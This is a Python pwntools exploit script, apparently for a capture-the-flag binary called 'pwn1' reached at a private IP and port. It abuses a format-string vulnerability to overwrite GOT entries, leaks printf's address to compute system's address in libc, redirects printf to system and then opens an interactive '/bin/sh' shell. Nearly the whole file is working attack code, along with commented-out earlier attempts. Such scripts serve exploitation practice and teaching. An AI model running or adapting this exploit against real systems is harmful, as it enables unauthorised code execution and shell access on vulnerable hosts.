from pwn import *

debug = 1
local = 0
attach = local & 1
bps = attach & 1
proc_name = 'pwn1'
#socat TCP4-LISTEN:10001,fork EXEC:./pwn1
ip = '10.105.42.5'
port = 2333
io = None

def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def sn(data):
	return io.send(data)
def rl():
	return io.recvline()

def exec_fmt(payload):  
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
    io.recvuntil('~\n')
    io.sendline(payload)
    info = io.recv()
    io.close()
    return info



def pwn():
	makeio()
	if debug:
		context.log_level = 'debug'
	if attach:
		if bps:
			gdb.attach(pidof(proc_name)[0], open('bps'))
		else:
			gdb.attach(pidof(proc_name)[0])

	
	autofmt = FmtStr(exec_fmt)  
	print autofmt.offset  



	ru('~\n')
	exit_got = 0x804a024
	#entrypoint = 0x080485DD
	entrypoint = 0x0804866E

	offset = 7

	entrypoint_h = entrypoint >>16;
	entrypoint_l = entrypoint & 0xffff;
	payload = fmtstr_payload(offset, { exit_got: entrypoint})
	sl(payload)




	#payload = "%" + str(entrypoint_h) + "c%15$hn%" + str( entrypoint_l -entrypoint_h) + "c%14$hn"

	#payload = payload.ljust(28,'A')

	# print payload
	# payload +=  p32(exit_got)  + p32(exit_got+0x2)


	# rv()
	# sl("ABCD%7$p")
	# rv()

	# exit_got = 0x804a024
	# entrypoint = 0x80485DD
	# offset = 7
	# payload = fmtstr_payload(offset, { exit_got: entrypoint})
	# print payload
	# sl(payload)
	# sl(payload)
	# sl("%6$x")
	# rv()
	# sl("%7$x")
	# rv()
	rv()  #!!!!!!!!!
	libc=ELF('./libc-32.so')  #-------?
	printf_got= 0x0804a014 # libc.symbols['printf']  #---------?
	offset = 7
	#payload = 'ABCDAAAAAAAAAAAAAAA'+p32(printf_got) + "%p|%p|%p|"    #autofmt.offset  
	payload = p32(printf_got) + "%7$s"
	sl(payload)
	data = rv()
	print 'data---------'+data
	printf_addr = u32(data[4:8])
	print "printf addr %#x" % printf_addr
	# autofmt = FmtStr(exec_fmt)  
	# print autofmt.offset  


	printf_offset = libc.symbols['printf']
	print 'printf_offset  %#x'  % printf_offset

	system_offset = libc.symbols['system']
	print 'system_offset  %#x'  % system_offset

	system_addr = printf_addr -  printf_offset +  system_offset
	print 'system_addr  %#x'  % system_addr
	payload = fmtstr_payload(offset, {printf_got: system_addr})
	sl(payload)
	rv()
	sl('/bin/sh\x00')
	io.interactive()


if __name__ == '__main__':
	pwn()